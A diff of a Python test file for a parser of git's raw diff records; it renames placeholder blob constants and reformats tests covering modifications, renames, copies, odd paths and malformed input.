 def test_parse_raw_reads_a_simple_modification():
     out = dcon.parse_raw(
-        raw(("100644", "100644", BLOB_A, BLOB_B, "M", ".github/workflows/codeql.yml"))
+        raw(
+            (
+                "100644",
+                "100644",
+                BLOB_PAYLOADQ_OLD,
+                BLOB_PAYLOADQ_NEW,
+                "M",
+                ".github/workflows/codeql.yml",
+            )
+        )
     )
     assert out == [
-        dcon.TreeEntry(".github/workflows/codeql.yml", "M", "100644", BLOB_B)
+        dcon.TreeEntry(".github/workflows/codeql.yml", "M", "100644", BLOB_PAYLOADQ_NEW)
     ]
 
 
 def test_parse_raw_reads_several_records_from_one_nul_stream():
     out = dcon.parse_raw(
         raw(
-            ("100644", "100644", BLOB_A, BLOB_B, "M", "a.yml"),
-            ("000000", "100644", ZEROS, BLOB_C, "A", "b.yml"),
+            ("100644", "100644", BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW, "M", "a.yml"),
+            ("000000", "100644", ZEROS, BLOB_PAYLOAD, "A", "b.yml"),
         )
     )
     assert [e.path for e in out] == ["a.yml", "b.yml"]
@@ -599,8 +812,8 @@ def test_parse_raw_expands_a_rename_into_a_source_deletion_and_a_destination():
             (
                 "100644",
                 "100644",
-                BLOB_A,
-                BLOB_A,
+                BLOB_PAYLOADQ_OLD,
+                BLOB_PAYLOADQ_OLD,
                 "R100",
                 ".github/workflows/codeql.yml",
                 "docs/codeql.yml",
@@ -608,7 +821,7 @@ def test_parse_raw_expands_a_rename_into_a_source_deletion_and_a_destination():
         )
     )
     assert dcon.TreeEntry(".github/workflows/codeql.yml", "D", "000000", ZEROS) in out
-    assert dcon.TreeEntry("docs/codeql.yml", "R", "100644", BLOB_A) in out
+    assert dcon.TreeEntry("docs/codeql.yml", "R", "100644", BLOB_PAYLOADQ_OLD) in out
 
 
 def test_parse_raw_does_not_desync_on_the_second_path_of_a_rename():
@@ -619,16 +832,34 @@ def test_parse_raw_does_not_desync_on_the_second_path_of_a_rename():
     """
     out = dcon.parse_raw(
         raw(
-            ("100644", "100644", BLOB_A, BLOB_A, "R100", "old.yml", "new.yml"),
-            ("100644", "100644", BLOB_B, BLOB_C, "M", "after.yml"),
+            (
+                "100644",
+                "100644",
+                BLOB_PAYLOADQ_OLD,
+                BLOB_PAYLOADQ_OLD,
+                "R100",
+                "old.yml",
+                "new.yml",
+            ),
+            ("100644", "100644", BLOB_PAYLOADQ_NEW, BLOB_PAYLOAD, "M", "after.yml"),
         )
     )
-    assert dcon.TreeEntry("after.yml", "M", "100644", BLOB_C) in out
+    assert dcon.TreeEntry("after.yml", "M", "100644", BLOB_PAYLOAD) in out
 
 
 def test_parse_raw_expands_a_copy_without_deleting_the_source():
     out = dcon.parse_raw(
-        raw(("100644", "100644", BLOB_A, BLOB_A, "C75", "src.yml", "copy.yml"))
+        raw(
+            (
+                "100644",
+                "100644",
+                BLOB_PAYLOADQ_OLD,
+                BLOB_PAYLOADQ_OLD,
+                "C75",
+                "src.yml",
+                "copy.yml",
+            )
+        )
     )
     assert [e.path for e in out] == ["copy.yml"]
 
@@ -636,7 +867,17 @@ def test_parse_raw_expands_a_copy_without_deleting_the_source():
 def test_parse_raw_drops_the_similarity_score_from_the_status():
     """The score reflects git's rename-detection budget, not the change."""
     out = dcon.parse_raw(
-        raw(("100644", "100644", BLOB_A, BLOB_A, "R087", "old.yml", "new.yml"))
+        raw(
+            (
+                "100644",
+                "100644",
+                BLOB_PAYLOADQ_OLD,
+                BLOB_PAYLOADQ_OLD,
+                "R087",
+                "old.yml",
+                "new.yml",
+            )
+        )
     )
     assert out[-1].status == "R"
 
@@ -647,8 +888,10 @@ def test_parse_raw_keeps_a_path_containing_a_newline_intact():
     A path with a newline in it would split a line-oriented parser's record
     in half; here it is simply part of one field.
     """
-    out = dcon.parse_raw(raw(("000000", "100644", ZEROS, BLOB_A, "A", "we\nird.yml")))
-    assert out == [dcon.TreeEntry("we\nird.yml", "A", "100644", BLOB_A)]
+    out = dcon.parse_raw(
+        raw(("000000", "100644", ZEROS, BLOB_PAYLOADQ_OLD, "A", "we\nird.yml"))
+    )
+    assert out == [dcon.TreeEntry("we\nird.yml", "A", "100644", BLOB_PAYLOADQ_OLD)]
 
 
 def test_parse_raw_rejects_a_record_without_a_leading_colon():
@@ -669,17 +912,24 @@ def test_parse_raw_rejects_a_metadata_field_with_the_wrong_arity():
 
 def test_parse_raw_rejects_a_record_with_no_path_field():
     with pytest.raises(dcon.RawParseError):
-        dcon.parse_raw(":100644 100644 %s %s M\0" % (BLOB_A, BLOB_B))
+        dcon.parse_raw(
+            ":100644 100644 %s %s M\0" % (BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW)
+        )
 
 
 def test_parse_raw_rejects_a_rename_with_no_destination_path():
     with pytest.raises(dcon.RawParseError):
-        dcon.parse_raw(":100644 100644 %s %s R100\0old.yml\0" % (BLOB_A, BLOB_A))
+        dcon.parse_raw(
+            ":100644 100644 %s %s R100\0old.yml\0"
+            % (BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_OLD)
+        )
 
 
 def test_parse_raw_rejects_an_empty_status():
     with pytest.raises(dcon.RawParseError):
-        dcon.parse_raw(":100644 100644 %s %s \0a.yml\0" % (BLOB_A, BLOB_B))
+        dcon.parse_raw(
+            ":100644 100644 %s %s \0a.yml\0" % (BLOB_PAYLOADQ_OLD, BLOB_PAYLOADQ_NEW)
+        )
 
 
 def test_entries_by_path_rejects_a_duplicated_path():
@@ -687,8 +937,15 @@ def test_entries_by_path_rejects_a_duplicated_path():
     with pytest.raises(dcon.RawParseError):
         dcon.entries_by_path(
             raw(
-                ("100644", "100644", BLOB_A, BLOB_B, "M", "a.yml"),
-                ("100644", "100644", BLOB_B, BLOB_C, "M", "a.yml"),
+                (
+                    "100644",
+                    "100644",
+                    BLOB_PAYLOADQ_OLD,
+                    BLOB_PAYLOADQ_NEW,
+                    "M",
+                    "a.yml",
+                ),
+                ("100644", "100644", BLOB_PAYLOADQ_NEW, BLOB_PAYLOAD, "M", "a.yml"),
             )
         )
 
